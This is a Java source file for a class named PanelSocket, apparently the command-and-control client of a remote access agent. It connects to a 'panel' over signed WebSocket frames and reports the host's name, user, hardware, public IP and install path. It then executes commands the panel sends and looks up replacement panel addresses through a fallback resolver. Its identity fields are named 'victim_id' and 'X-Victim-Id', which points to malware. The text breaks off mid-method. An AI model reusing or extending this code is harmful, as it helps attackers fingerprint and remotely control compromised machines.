package com.spcagentpayloa.jvmxx;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.WebSocket;
import java.nio.ByteBuffer;
import java.nio.charset.CharacterCodingException;
import java.nio.charset.CodingErrorAction;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CompletionStage;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

import com.spcagentpayloa.jvmxx.crypto.CryptoConfig;
import com.spcagentpayloa.jvmxx.crypto.CertificatePins;

/**
 * Control channel to the panel. Transport only: tickets, signed frames, ACK,
 * dedup and the command handoff. Artifacts keep using the HTTPS API.
 */
public final class PanelSocket {
	private static final int MAX_FRAME = 262_144;
	private static final long HANDSHAKE_MS = 5_000L;
	private static final long PING_MS = 20_000L;
	private static final long PONG_DEADLINE_MS = 45_000L;
	private static final long BACKOFF_MIN = 1_000L;
	private static final long BACKOFF_MAX = 60_000L;
	private static final long RESOLVE_TTL_MS = 600_000L;
	private static final long SKEW_SEC = 300L;
	private static final int DEDUP_WINDOW = 1024;
	private static final int NONCE_WINDOW = 600;
	private static final long NONCE_TTL_MS = 600_000L;
	private static final int FRAME_LIMIT = 240;
	private static final int FRAME_BURST = 40;
	private static final int MAX_IN_FLIGHT = 4;
	private static final byte[] BUSY_BODY =
		"{\"status\":\"error\",\"error\":\"busy\",\"result\":{},\"artifacts\":[]}".getBytes(StandardCharsets.UTF_8);
	private static final String[] HELLO_ORDER = {
		"hostname", "user", "os", "cpu", "ram", "gpu", "resolution", "java", "agent", "public_ip", "path",
		"first", "expect_seq_in"
	};

	private record Identity(String victimId, String deviceToken) {
	}

	private record Ticket(String value, String nonce, String deviceId) {
	}

	private record Keys(byte[] c2a, byte[] a2c) {
	}

	private record Frame(String payload, Map<String, Object> json, long seq, String nonce) {
	}

	private final Poller poller;
	private final Path installDir;
	private final Path work;
	private final CommandExecutor executor;
	private final HttpClient http;
	private final ExecutorService httpExecutor;
	private final ScheduledExecutorService scheduler;
	private final SecureRandom random = new SecureRandom();
	private final BlockingQueue<Frame> inbox = new LinkedBlockingQueue<>();
	private final Map<String, Long> nonces = new LinkedHashMap<>();
	private final LinkedHashSet<String> seen = new LinkedHashSet<>();
	private final Set<String> inFlight = ConcurrentHashMap.newKeySet();
	private final Set<String> reconnectAfter = ConcurrentHashMap.newKeySet();
	private final Map<String, ScheduledFuture<?>> reconnectAcks = new ConcurrentHashMap<>();
	private final StringBuilder partial = new StringBuilder();

	private volatile boolean running = true;
	private volatile Thread thread;
	private volatile WebSocket socket;
	private volatile CountDownLatch closed;
	private volatile Keys keys;
	private volatile int closeCode = 1006;
	private volatile long lastInbound;
	private volatile long lastPong;
	private volatile int failures;
	private volatile int supersedes;
	private volatile String resolvedEndpoint = "";
	private volatile long resolvedAt;
	private volatile ScheduledFuture<?> ping;
	private long lastIn;
	private long inFloor;
	private long outSeq;
	private double tokens = FRAME_BURST;
	private long refillAt;
	private boolean ready;

	public PanelSocket(Poller poller, Path installDir, CommandExecutor executor) {
		this.poller = poller;
		this.installDir = installDir;
		this.executor = executor;
		this.work = AgentPaths.cache(installDir).resolve("ws");
		loadSeen();
		this.httpExecutor = Executors.newCachedThreadPool(runnable -> {
			Thread thread = new Thread(runnable, "spc-panel-http");
			thread.setDaemon(true);
			return thread;
		});
		// HTTP/1.1 keeps the ticket POST away from an h2c upgrade the panel
		// router would not route.
		HttpClient.Builder builder = HttpClient.newBuilder()
			.version(HttpClient.Version.HTTP_1_1)
			.connectTimeout(Duration.ofSeconds(10))
			.executor(httpExecutor);
		CryptoConfig tls = CryptoConfig.load(installDir);
		if (CertificatePins.enabled(tls)) {
			try {
				builder.sslContext(CertificatePins.context(tls));
			} catch (Exception exception) {
				com.spcagentpayloa.jvmxx.Log.debug("WS pin init failed", exception);
			}
		}
		this.http = builder.build();
		this.scheduler = Executors.newSingleThreadScheduledExecutor(runnable -> {
			Thread thread = new Thread(runnable, "spc-panel-ping");
			thread.setDaemon(true);
			return thread;
		});
	}

	public void start() {
		if (thread != null) {
			return;
		}
		thread = new Thread(this::loop, "spc-panel");
		thread.setDaemon(true);
		thread.start();
	}

	public void stop() {
		running = false;
		closeQuietly(1000, "shutdown");
		Thread current = thread;
		if (current != null) {
			current.interrupt();
		}
	}

	public boolean healthy(long now) {
		WebSocket current = socket;
		return current != null && !current.isInputClosed() && ready && now - lastInbound < PONG_DEADLINE_MS;
	}

	public long lastInboundAt() {
		return lastInbound;
	}

	private void loop() {
		while (running) {
			long delay;
			try {
				int code = attempt();
				delay = after(code);
			} catch (Throwable throwable) {
				failures++;
				if (failures >= 3) resolve();
				delay = backoff();
				Log.debug("panel socket: " + shortMessage(throwable));
			}
			if (!running) {
				return;
			}
			if (!sleep(delay)) {
				return;
			}
		}
	}

	private long after(int code) {
		if (code == 426) {
			Log.debug("panel socket: no upgrade, waiting five minutes");
			return 300_000L;
		}
		if (code == 1000) {
			running = false;
			return 0L;
		}
		failures++;
		if (code == 4409) {
			supersedes++;
			long delay = 5_000L + random.nextInt(5_001);
			// Three consecutive supersedes double the backoff.
			return supersedes % 3 == 0 ? Math.min(delay * 2L, BACKOFF_MAX) : delay;
		}
		if (failures >= 3) resolve();
		return backoff();
	}

	private long backoff() {
		long cap = Math.min(BACKOFF_MAX, BACKOFF_MIN << Math.min(Math.max(failures - 1, 0), 6));
		long jitter = Math.max(1L, cap / 5L);
		return Math.max(BACKOFF_MIN, cap - jitter + random.nextInt((int) (jitter * 2L) + 1));
	}

	private boolean sleep(long millis) {
		long until = System.currentTimeMillis() + millis;
		while (running) {
			long left = until - System.currentTimeMillis();
			if (left <= 0L) {
				return true;
			}
			try {
				Thread.sleep(Math.min(left, 1_000L));
			} catch (InterruptedException interrupted) {
				if (!running) {
					return false;
				}
			}
		}
		return false;
	}

	/** One connect attempt. Returns the close code, 0 when it never opened. */
	private int attempt() throws Exception {
		CryptoConfig config = CryptoConfig.load(installDir);
		if (config == null || config.panelUrl.isEmpty()) {
			sleep(10_000L);
			return 0;
		}
		Identity identity = identity();
		if (identity == null) {
			sleep(10_000L);
			return 0;
		}
		String endpoint = endpoint(config);
		Ticket ticket = ticket(endpoint, identity);
		if (ticket == null) {
			return 426;
		}
		long cursor = cursor();
		String url = wsUrl(endpoint, ticket, cursor);
		CountDownLatch current = new CountDownLatch(1);
		closed = current;
		partial.setLength(0);
		inbox.clear();
		nonces.clear();
		ready = false;

		WebSocket opened = http.newWebSocketBuilder()
			.connectTimeout(Duration.ofSeconds(15))
			.buildAsync(URI.create(url), new Listener())
			.get(20, TimeUnit.SECONDS);
		socket = opened;
		keys = new Keys(
			hkdf(Base64.getUrlDecoder().decode(ticket.value()), Base64.getUrlDecoder().decode(ticket.nonce()), "spc-ws-v1/c2a"),
			hkdf(Base64.getUrlDecoder().decode(ticket.value()), Base64.getUrlDecoder().decode(ticket.nonce()), "spc-ws-v1/a2c")
		);
		lastInbound = System.currentTimeMillis();
		lastPong = lastInbound;

		closeCode = 1006;
		int code = session(ticket);
		closeQuietly(code == 0 ? 1006 : code, "");
		current.await(2L, TimeUnit.SECONDS);
		socket = null;
		keys = null;
		ready = false;
		return code;
	}

	private int session(Ticket ticket) throws Exception {
		Frame helloOk = await(HANDSHAKE_MS);
		if (helloOk == null) {
			return 4408;
		}
		String invalid = validate(helloOk, true);
		if (invalid != null) {
			return protocol(invalid.startsWith("auth") ? 4401 : 4400);
		}
		if (!"hello_ok".equals(helloOk.json().get("type"))) {
			return protocol(4400);
		}
		inFloor = num(helloOk.json(), "expect_seq_out", 0L);
		if (helloOk.seq() <= inFloor) {
			return protocol(4400);
		}
		lastIn = num(helloOk.json(), "expect_seq_in", 0L);
		outSeq = lastIn + 1;
		try {
			ack(String.valueOf(helloOk.json().get("id")));
		} catch (Throwable throwable) {
			return 4408;
		}
		String helloId = hello(ticket.deviceId());
		if (helloId == null) {
			return 4408;
		}
		Frame ack = await(HANDSHAKE_MS);
		if (ack == null) {
			return 4408;
		}
		String problem = validate(ack, false);
		if (problem != null) {
			return protocol(problem.startsWith("auth") ? 4401 : 4400);
		}
		if (!"ack".equals(ack.json().get("type")) || !helloId.equals(ack.json().get("reply_to"))) {
			return protocol(4400);
		}
		failures = 0;
		supersedes = 0;
		ready = true;
		lastInbound = System.currentTimeMillis();
		lastPong = lastInbound;
		startPing();
		reconcilePending();
		try {
			while (running) {
				Frame frame = inbox.take();
				if (!running) {
					return 1000;
				}
				int stop = handle(frame);
				if (stop != 0) {
					return stop;
				}
			}
		} catch (InterruptedException interrupted) {
			return running ? closeCode : 1000;
		}
		return 1000;
	}

	private int handle(Frame frame) {
		lastInbound = System.currentTimeMillis();
		String problem = validate(frame, false);
		if (problem != null) {
			return protocol(problem.startsWith("auth") ? 4401 : 4400);
		}
		Map<String, Object> json = frame.json();
		String id = Json.str(json, "id", "");
		String type = Json.str(json, "type", "");
		if (seen.contains(id)) {
			if ("ping".equals(type)) {
				pong(id);
			} else {
				ack(id);
			}
			return 0;
		}
		if (frame.seq() <= inFloor) {
			return protocol(4400);
		}
		if (frame.seq() <= lastIn) {
			return protocol(4400);
		}
		if (Math.abs(System.currentTimeMillis() / 1000L - num(json, "ts", 0L)) > SKEW_SEC) {
			return protocol(4400);
		}
		lastIn = frame.seq();
		markSeen(id);
		saveCursor(lastIn);
		if (!ready && !"ack".equals(type) && !"bye".equals(type) && !"ping".equals(type)) {
			return protocol(4400);
		}
		switch (type) {
			case "cmd" -> {
				String taskId = Json.str(json, "task_id", "");
				String name = Json.str(json, "name", "");
				if (taskId.isEmpty() || name.isEmpty() || !(json.get("args") instanceof Map)) {
					return protocol(4400);
				}
				long timeoutMs = Math.max(1_000L, Math.min(300_000L, num(json, "timeout_ms", 30_000L)));
				writePending(taskId, frame.payload() + "}");
				ack(id);
				if (inFlight.size() >= MAX_IN_FLIGHT) {
					// After the ACK, per contract: no queue, no silent drop.
					deliverResult(id, name, BUSY_BODY);
					return 0;
				}
				inFlight.add(id);
				dispatch(name, taskId, Json.map(json.get("args")), id, timeoutMs);
				return 0;
			}
			case "ping" -> {
				lastPong = System.currentTimeMillis();
				pong(id);
				return 0;
			}
			case "pong" -> {
				lastPong = System.currentTimeMillis();
				return 0;
			}
			case "bye" -> {
				return (int) num(json, "code", 1000L);
			}
			case "ack" -> {
				String replyTo = Json.str(json, "reply_to", "");
				ScheduledFuture<?> pending = reconnectAcks.remove(replyTo);
				if (pending != null) {
					pending.cancel(false);
					// Clean, normal close only after the result is ACKed.
					closeReconnect();
				}
				return 0;
			}
			default -> {
				return protocol(4400);
			}
		}
	}

	private void dispatch(String name, String taskId, Map<String, Object> args) {
		dispatch(name, taskId, args, taskId, 30_000L);
	}

	private void dispatch(String name, String taskId, Map<String, Object> args, String replyTo, long timeoutMs) {
		Log.debug("dispatch " + name + " " + taskId);
		try {
			executor.handleCmd(name, taskId, args, (int) timeoutMs, replyTo);
		} catch (Throwable throwable) {
			Log.debug("panel cmd dispatch failed: " + shortMessage(throwable));
			deliverResult(replyTo, name, ("{\"status\":\"error\",\"error\":\"" + escape(shortMessage(throwable))
				+ "\",\"result\":{},\"artifacts\":[]}").getBytes(StandardCharsets.UTF_8));
		}
	}

	/** Envelope bytes through `"body":` + the verbatim body + `}`, before `sig`. */
	static byte[] renderResultBytes(String id, long seq, String nonce, String replyTo, byte[] body) {
		ByteArrayOutputStream payload = new ByteArrayOutputStream(body.length + 192);
		payload.writeBytes(("{\"v\":1,\"id\":\"" + id + "\",\"seq\":" + seq + ",\"ts\":"
			+ System.currentTimeMillis() / 1000L + ",\"type\":\"result\",\"nonce\":\"" + nonce
			+ "\",\"reply_to\":\"" + replyTo + "\",\"body\":").getBytes(StandardCharsets.UTF_8));
		payload.write(body, 0, body.length);
		payload.write('}');
		return payload.toByteArray();
	}

	/** The next result for this reply_to closes the socket after its ACK. */
	public void armReconnect(String replyTo) {
		if (replyTo != null && !replyTo.isEmpty()) reconnectAfter.add(replyTo);
	}

	/** Send a `result` with the body bytes inserted verbatim, never re-serialized. */
	boolean deliverResult(String replyTo, String name, byte[] body) {
		inFlight.remove(replyTo);
		if (body.length > MAX_FRAME - 512) {
			return false;
		}
		try {
			Keys current = keys;
			WebSocket active = socket;
			Log.debug("deliverResult replyTo=" + replyTo + " ready=" + ready + " keys=" + (current != null)
				+ " socket=" + (active != null));
			if (current == null || active == null || !ready || active.isOutputClosed()) {
				return false;
			}
			String id = UUID.randomUUID().toString();
			long seq = outSeq++;
			String nonce = nonce();
			byte[] payload = renderResultBytes(id, seq, nonce, replyTo, body);
			String signature = signature(current.a2c(), seq, nonce, payload);
			active.sendText(new String(payload, StandardCharsets.UTF_8) + ",\"sig\":\"" + signature + "\"}", true);
			if (reconnectAfter.remove(replyTo)) {
				ScheduledFuture<?> timer = scheduler.schedule(() -> {
					reconnectAcks.remove(id);
					closeReconnect();
				}, 2L, TimeUnit.SECONDS);
				reconnectAcks.put(id, timer);
			}
			return true;
		} catch (Throwable throwable) {
			Log.debug("panel result send failed: " + shortMessage(throwable));
			return false;
		}
	}

	// --- handshake outbound -------------------------------------------------

	private String hello(String deviceId) throws Exception {
		Map<String, Object> json = new LinkedHashMap<>();
		json.put("hostname", clip(SysInfo.hostname(), 128));
		json.put("user", clip(SysInfo.user(), 128));
		json.put("os", clip(SysInfo.os(), 160));
		json.put("cpu", clip(SysInfo.cpu(), 160));
		json.put("ram", clip(SysInfo.ram(), 64));
		json.put("gpu", clip(SysInfo.gpu(), 160));
		json.put("resolution", clip(SysInfo.resolution(), 64));
		json.put("java", clip(SysInfo.java(), 64));
		json.put("agent", clip(Version.current(), 32));
		json.put("public_ip", clip(publicIp(), 64));
		json.put("path", clip(installDir.toString(), 1024));
		json.put("first", firstConnection());
		json.put("expect_seq_in", lastIn);
		List<Object> values = new ArrayList<>();
		for (String field : HELLO_ORDER) {
			values.add(json.get(field));
		}
		return send("hello", values);
	}

	private String publicIp() {
		Path cached = work.resolve("public_ip");
		try {
			if (Files.isRegularFile(cached)) {
				String value = Files.readString(cached, StandardCharsets.UTF_8).trim();
				if (!value.isEmpty()) {
					return value;
				}
			}
		} catch (Throwable ignored) {
			// fall through
		}
		String value = SysInfo.publicIp();
		try {
			Files.createDirectories(work);
			Files.writeString(cached, value, StandardCharsets.UTF_8);
		} catch (Throwable ignored) {
			// optional
		}
		return value;
	}

	private boolean firstConnection() {
		Path marker = work.resolve("hello");
		try {
			if (Files.isRegularFile(marker)) {
				return false;
			}
			Files.createDirectories(work);
			Files.writeString(marker, "1", StandardCharsets.UTF_8);
			return true;
		} catch (Throwable ignored) {
			return false;
		}
	}

	// --- frame codec --------------------------------------------------------

	private String send(String type, List<Object> values) throws Exception {
		Keys current = keys;
		if (current == null) {
			throw new IllegalStateException("no keys");
		}
		String id = UUID.randomUUID().toString();
		long seq = outSeq++;
		String nonce = nonce();
		String payload = render(type, id, seq, nonce, values);
		// The HMAC covers the whole object; the signature replaces its last brace.
		// Panel frames carry K_c2a (see the contract vector); ours carry K_a2c.
		String signature = signature(current.a2c(), seq, nonce, payload.getBytes(StandardCharsets.UTF_8));
		String text = payload.substring(0, payload.length() - 1) + ",\"sig\":\"" + signature + "\"}";
		WebSocket active = socket;
		if (active != null) {
			active.sendText(text, true);
		}
		return id;
	}

	private void ack(String replyTo) {
		try {
			send("ack", List.of(replyTo));
		} catch (Throwable throwable) {
			Log.debug("panel ack failed: " + shortMessage(throwable));
		}
	}

	/** Single event entry point. False when the socket is down; no queueing. */
	public boolean emitEvent(String kind, Map<String, Object> data, String legacy) {
		WebSocket active = socket;
		if (!ready || active == null) {
			return false;
		}
		try {
			send("event", List.of(kind, data, legacy));
			return true;
		} catch (Throwable throwable) {
			Log.debug("panel event send failed: " + shortMessage(throwable));
			return false;
		}
	}

	private void pong(String replyTo) {
		try {
			send("pong", List.of(replyTo));
		} catch (Throwable throwable) {
			Log.debug("panel pong failed: " + shortMessage(throwable));
		}
	}

	/** Normal reconnect shutdown: bye 1000 then a Close with the same code. */
	private void closeReconnect() {
		try {
			send("bye", List.of(1000, "reconnect"));
		} catch (Throwable throwable) {
			Log.debug("panel reconnect bye failed: " + shortMessage(throwable));
		}
		closeQuietly(1000, "reconnect");
	}

	static String render(String type, String id, long seq, String nonce, List<Object> values) {
		return render(type, id, seq, nonce, values, System.currentTimeMillis() / 1000L);
	}

	static String render(String type, String id, long seq, String nonce, List<Object> values, long ts) {
		StringBuilder out = new StringBuilder(160);
		out.append("{\"v\":1,\"id\":\"").append(id).append("\",\"seq\":").append(seq)
			.append(",\"ts\":").append(ts)
			.append(",\"type\":\"").append(type).append("\",\"nonce\":\"").append(nonce).append('"');
		for (int index = 0; index < values.size(); index++) {
			out.append(",\"").append(field(type, index)).append("\":").append(value(values.get(index)));
		}
		out.append('}');
		return out.toString();
	}

	private static String field(String type, int index) {
		if (HELLO_ORDER.length > index && "hello".equals(type)) {
			return HELLO_ORDER[index];
		}
		if ("ack".equals(type) || "pong".equals(type)) {
			return "reply_to";
		}
		if ("bye".equals(type)) {
			return index == 0 ? "code" : "reason";
		}
		if ("cmd".equals(type)) {
			return switch (index) {
				case 0 -> "name";
				case 1 -> "args";
				case 2 -> "task_id";
				case 3 -> "timeout_ms";
				default -> "f" + index;
			};
		}
		if ("event".equals(type)) {
			return switch (index) {
				case 0 -> "kind";
				case 1 -> "data";
				case 2 -> "legacy";
				default -> "f" + index;
			};
		}
		return "f" + index;
	}

	private static String value(Object value) {
		if (value instanceof String text) {
			return '"' + escape(text) + '"';
		}
		if (value == null) {
			return "null";
		}
		if (value instanceof Number || value instanceof Boolean) {
			return value.toString();
		}
		return Json.stringify(value);
	}

	static String escape(String value) {
		StringBuilder out = new StringBuilder(value.length() + 16);
		for (int index = 0; index < value.length(); index++) {
			char current = value.charAt(index);
			switch (current) {
				case '"' -> out.append("\\\"");
				case '\\' -> out.append("\\\\");
				case '\b' -> out.append("\\b");
				case '\f' -> out.append("\\f");
				case '\n' -> out.append("\\n");
				case '\r' -> out.append("\\r");
				case '\t' -> out.append("\\t");
				default -> {
					if (current < 0x20) {
						out.append(String.format("\\u%04x", (int) current));
					} else {
						out.append(current);
					}
				}
			}
		}
		return out.toString();
	}

	/** Validation shared by the handshake wait and the event loop. */
	private String validate(Frame frame, boolean handshake) {
		if (frame.payload().getBytes(StandardCharsets.UTF_8).length > MAX_FRAME) {
			return "size";
		}
		Map<String, Object> json = frame.json();
		if (!Long.valueOf(1L).equals(asLong(json.get("v")))) {
			return "version";
		}
		Keys current = keys;
		if (current == null) {
			return "auth";
		}
		String signature = Json.str(json, "sig", "");
		byte[] signed = (frame.payload() + "}").getBytes(StandardCharsets.UTF_8);
		if (!verify(current.c2a(), frame.seq(), frame.nonce(), signed, signature)) {
			return "auth";
		}
		String id = Json.str(json, "id", "");
		if (id.isEmpty() || frame.nonce().isEmpty()) {
			return "auth";
		}
		// A duplicate id is re-ACKed and skips the nonce and sequence checks.
		if (seen.contains(id)) {
			return null;
		}
		if (nonces.containsKey(frame.nonce())) {
			return "nonce";
		}
		long now = System.currentTimeMillis();
		if (nonces.size() > NONCE_WINDOW) {
			nonces.entrySet().removeIf(entry -> now - entry.getValue() > NONCE_TTL_MS);
		}
		nonces.put(frame.nonce(), now);
		String type = Json.str(json, "type", "");
		if (!"hello_ok".equals(type) && !"ack".equals(type) && !"cmd".equals(type)
			&& !"ping".equals(type) && !"pong".equals(type) && !"bye".equals(type)) {
			return "type";
		}
		if (!spend()) {
			return "rate";
		}
		if (handshake && !"hello_ok".equals(type)) {
			return "type";
		}
		if (("ack".equals(type) || "pong".equals(type)) && Json.str(json, "reply_to", "").isEmpty()) {
			return "field";
		}
		if ("cmd".equals(type)) {
			if (Json.str(json, "task_id", "").isEmpty() || Json.str(json, "name", "").isEmpty()
				|| !(json.get("args") instanceof Map)) {
				return "field";
			}
		}
		if ("bye".equals(type) && !(json.get("code") instanceof Number)) {
			return "field";
		}
		return null;
	}

	private boolean spend() {
		long now = System.currentTimeMillis();
		tokens = Math.min(FRAME_BURST, tokens + (now - refillAt) / 60_000.0 * FRAME_LIMIT);
		refillAt = now;
		if (tokens < 1.0) {
			return false;
		}
		tokens -= 1.0;
		return true;
	}

	private int protocol(int code) {
		Log.debug("panel socket protocol close " + code);
		closeQuietly(code, code == 4401 ? "auth" : "protocol");
		return code;
	}

	private void closeQuietly(int code, String reason) {
		WebSocket active = socket;
		if (active != null) {
			try {
				active.sendClose(code, reason).get(1, TimeUnit.SECONDS);
			} catch (Throwable ignored) {
				try {
					active.abort();
				} catch (Throwable ignoredAgain) {
					// closed
				}
			}
		}
		ScheduledFuture<?> timer = ping;
		if (timer != null) {
			timer.cancel(false);
		}
		CountDownLatch latch = closed;
		if (latch != null) {
			latch.countDown();
		}
	}

	private void startPing() {
		ScheduledFuture<?> timer = ping;
		if (timer != null) {
			timer.cancel(false);
		}
		ping = scheduler.scheduleWithFixedDelay(() -> {
			try {
				if (!running || !ready) {
					return;
				}
				if (System.currentTimeMillis() - lastPong > PONG_DEADLINE_MS) {
					Log.debug("panel pong timeout");
					closeQuietly(4408, "pong timeout");
					return;
				}
				send("ping", List.of());
			} catch (Throwable throwable) {
				Log.debug("panel ping failed: " + shortMessage(throwable));
			}
		}, PING_MS, PING_MS, TimeUnit.MILLISECONDS);
	}

	private Frame await(long millis) throws InterruptedException {
		Frame frame = inbox.poll(millis, TimeUnit.MILLISECONDS);
		return frame;
	}

	// --- crypto -------------------------------------------------------------

	static byte[] hkdf(byte[] ikm, byte[] salt, String info) throws Exception {
		Mac mac = Mac.getInstance("HmacSHA256");
		mac.init(new SecretKeySpec(salt, "HmacSHA256"));
		byte[] prk = mac.doFinal(ikm);
		mac.init(new SecretKeySpec(prk, "HmacSHA256"));
		ByteArrayOutputStream out = new ByteArrayOutputStream(32);
		byte[] previous = new byte[0];
		for (int round = 1; out.size() < 32; round++) {
			mac.update(previous);
			mac.update(info.getBytes(StandardCharsets.UTF_8));
			mac.update((byte) round);
			previous = mac.doFinal();
			out.write(previous, 0, previous.length);
		}
		byte[] full = out.toByteArray();
		byte[] key = new byte[32];
		System.arraycopy(full, 0, key, 0, 32);
		return key;
	}

	static String signature(byte[] key, long seq, String nonce, byte[] payload) throws Exception {
		return Base64.getUrlEncoder().withoutPadding().encodeToString(hmac(key, seq, nonce, payload));
	}

	private static byte[] hmac(byte[] key, long seq, String nonce, byte[] payload) throws Exception {
		Mac mac = Mac.getInstance("HmacSHA256");
		mac.init(new SecretKeySpec(key, "HmacSHA256"));
		mac.update(Long.toString(seq).getBytes(StandardCharsets.US_ASCII));
		mac.update((byte) 0x1f);
		mac.update(nonce.getBytes(StandardCharsets.US_ASCII));
		mac.update((byte) 0x1f);
		mac.update(payload);
		return mac.doFinal();
	}

	private static boolean verify(byte[] key, long seq, String nonce, byte[] payload, String signature) {
		try {
			byte[] received = Base64.getUrlDecoder().decode(signature);
			return MessageDigest.isEqual(hmac(key, seq, nonce, payload), received);
		} catch (Throwable throwable) {
			return false;
		}
	}

	private String nonce() {
		byte[] bytes = new byte[16];
		random.nextBytes(bytes);
		return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
	}

	// --- ticket, identity, endpoint -----------------------------------------

	private Identity identity() {
		Path file = AgentPaths.cache(installDir).resolve("crypto").resolve("state.json");
		try {
			if (!Files.isRegularFile(file)) {
				return null;
			}
			Map<String, Object> state = Json.parseObject(Files.readString(file, StandardCharsets.UTF_8));
			String victim = Json.str(state, "victim_id", "");
			String token = Json.str(state, "device_token", "");
			return victim.isEmpty() || token.isEmpty() ? null : new Identity(victim, token);
		} catch (Throwable throwable) {
			return null;
		}
	}

	private Ticket ticket(String endpoint, Identity identity) throws Exception {
		String path = "/api/v1/ws-ticket";
		HttpResponse<byte[]> reply = signed(endpoint, "POST", path, new byte[0], identity);
		if (reply.statusCode() == 426) {
			return null;
		}
		if (reply.statusCode() != 201) {
			throw new IllegalStateException("ticket status " + reply.statusCode());
		}
		Map<String, Object> json = Json.parseObject(new String(reply.body(), StandardCharsets.UTF_8));
		String value = Json.str(json, "ticket", "");
		String nonce = Json.str(json, "handshake_nonce", "");
		String device = Json.str(json, "device_id", identity.victimId());
		if (value.isEmpty() || nonce.isEmpty()) {
			throw new IllegalStateException("ticket shape");
		}
		return new Ticket(value, nonce, device);
	}

	/** The signature covers the path only; the query string is transport detail. */
	static String signedPath(String path) {
		int query = path.indexOf('?');
		return query < 0 ? path : path.substring(0, query);
	}

	private HttpResponse<byte[]> signed(String endpoint, String method, String path, byte[] body, Identity identity)
		throws Exception {
		String timestamp = Long.toString(System.currentTimeMillis() / 1000L);
		String nonce = nonce();
		String bodyHash = sha256hex(body);
		String canonical = method + "\n" + signedPath(path) + "\n" + timestamp + "\n" + nonce + "\n" + bodyHash + "\n";
		byte[] signature;
		Mac mac = Mac.getInstance("HmacSHA256");
		mac.init(new SecretKeySpec(Base64.getUrlDecoder().decode(identity.deviceToken()), "HmacSHA256"));
		signature = mac.doFinal(canonical.getBytes(StandardCharsets.UTF_8));
		HttpRequest.Builder request = HttpRequest.newBuilder(URI.create(endpoint + path))
			.timeout(Duration.ofSeconds(15))
			.header("X-Victim-Id", identity.victimId())
			.header("X-Timestamp", timestamp)
			.header("X-Nonce", nonce)
			.header("X-Signature", Base64.getUrlEncoder().withoutPadding().encodeToString(signature));
		if ("POST".equals(method)) {
			request.header("Content-Type", "application/json");
			request.POST(HttpRequest.BodyPublishers.ofByteArray(body));
		} else {
			request.GET();
		}
		return http.send(request.build(), HttpResponse.BodyHandlers.ofByteArray());
	}

	private static String sha256hex(byte[] body) throws Exception {
		byte[] digest = MessageDigest.getInstance("SHA-256").digest(body);
		StringBuilder out = new StringBuilder(digest.length * 2);
		for (byte value : digest) {
			out.append(String.format("%02x", value & 0xff));
		}
		return out.toString();
	}

	private String endpoint(CryptoConfig config) {
		String cached = resolvedEndpoint;
		if (!cached.isEmpty() && System.currentTimeMillis() - resolvedAt < RESOLVE_TTL_MS) {
			return cached;
		}
		if (failures >= 3 && !config.resolverUrl.isEmpty()) {
			String resolved = resolve(config.resolverUrl);
			if (!resolved.isEmpty()) {
				resolvedEndpoint = resolved;
				resolvedAt = System.currentTimeMillis();
				return resolved;
			}
		}
		return origin(config.panelUrl);
	}

	private void resolve() {
		// Forced on the next attempt: drop the cached endpoint now.
		resolvedAt = 0L;
	}

	private String resolve(String url) {
		try {
			HttpRequest request = HttpRequest.newBuilder(URI.create(url)).timeout(Duration.ofSeconds(5)).GET().build();
			HttpResponse<byte[]> reply = http.send(request, HttpResponse.BodyHandlers.ofByteArray());
			if (reply.statusCode() != 200) {
				return "";
			}
			String text = new String(reply.body(), StandardCharsets.UTF_8).trim();
			String candidate = text;
			if (text.startsWith("{")) {
				Map<String, Object> json = Json.parseObject(text);
				candidate = Json.str(json, "panel_url", Json.str(json, "url", ""));
			}
			return candidate.isEmpty() ? "" : origin(candidate);
		} catch (Throwable throwable) {
			return "";
		}
	}

	static String origin(String url) {
		String value = url.trim();
		if (value.startsWith("wss://")) {
			value = "https://" + value.substring(6);
		} else if (value.startsWith("ws://")) {
			value = "http://" + value.substring(5);
		}
		while (value.endsWith("/")) {
			value = value.substring(0, value.length() - 1);
		}
		if (value.endsWith("/api/v1")) {
			value = value.substring(0, value.length() - 7);
		}
		return value;
	}

	private static String wsUrl(String endpoint, Ticket ticket, long cursor) {
		String base = endpoint.startsWith("https://") ? "wss://" + endpoint.substring(8) : "ws://" + endpoint.substring(7);
		return base + "/api/v1/ws?ticket=" + encode(ticket.value())
			+ "&device_id=" + encode(ticket.deviceId())
			+ "&expect_seq_in=" + cursor;
	}

	private static String encode(String value) {
		return URLEncoder.encode(value, StandardCharsets.UTF_8);
	}

	// --- disk state ---------------------------------------------------------

	long cursor() {
		try {
			Path file = work.resolve("cursor");
			if (Files.isRegularFile(file)) {
				return Long.parseLong(Files.readString(file, StandardCharsets.UTF_8).trim());
			}
		} catch (Throwable ignored) {
			// start at zero
		}
		return 0L;
	}

	void saveCursor(long value) {
		try {
			Files.createDirectories(work);
			Path target = work.resolve("cursor");
			Path temp = work.resolve("cursor.tmp");
			Files.writeString(temp, Long.toString(value), StandardCharsets.UTF_8);
			Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
		} catch (Throwable throwable) {
			Log.debug("panel cursor save failed: " + shortMessage(throwable));
		}
	}

	private void loadSeen() {
		try {
			Path file = work.resolve("seen");
			if (!Files.isRegularFile(file)) {
				return;
			}
			for (String line : Files.readAllLines(file, StandardCharsets.UTF_8)) {
				String id = line.trim();
				if (!id.isEmpty()) {
					seen.add(id);
				}
			}
			while (seen.size() > DEDUP_WINDOW) {
				seen.remove(seen.iterator().next());
			}
		} catch (Throwable ignored) {
			// empty window
		}
	}

	void markSeen(String id) {
		if (id.isEmpty()) {
			return;
		}
		seen.add(id);
		while (seen.size() > DEDUP_WINDOW) {
